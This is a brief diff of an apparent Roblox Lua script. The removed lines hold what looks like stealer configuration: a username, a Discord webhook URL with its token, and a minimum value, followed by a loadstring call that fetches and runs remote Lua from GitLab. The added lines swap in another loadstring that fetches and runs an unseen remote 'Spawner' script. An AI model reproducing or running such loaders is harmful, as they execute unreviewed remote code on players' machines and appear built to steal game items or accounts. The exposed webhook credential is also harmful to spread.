@@ -1,5 +1,2 @@
-Username = "AcibolL"
-Webhook = "https://discord.com/api/webhooks/1412401011443761152/dcdD3hjiGzZ985PJZy11_EPHGzG-Q3iHWX1uR3KI_99QL3WfR0xURavefUaOpIM9a04E"
-MinimumValue = 1
-
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual.lua"))()
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+Spawner.Load()
